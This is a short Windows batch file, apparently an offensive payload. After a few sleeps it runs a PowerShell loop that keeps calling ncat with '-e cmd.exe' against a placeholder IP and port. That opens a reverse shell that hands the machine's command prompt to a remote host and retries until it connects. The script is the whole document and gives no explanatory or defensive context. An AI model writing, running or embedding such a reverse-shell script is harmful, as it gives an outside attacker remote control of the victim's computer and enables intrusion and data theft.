@ECHO OFF
cd %TEMP%
powershell.exe sleep 5
powershell -command do {ncat FF.FF.FF.FF 0000 -e cmd.exe} until ($ping)
powershell -command Start-Sleep -seconds 30
PAUSE
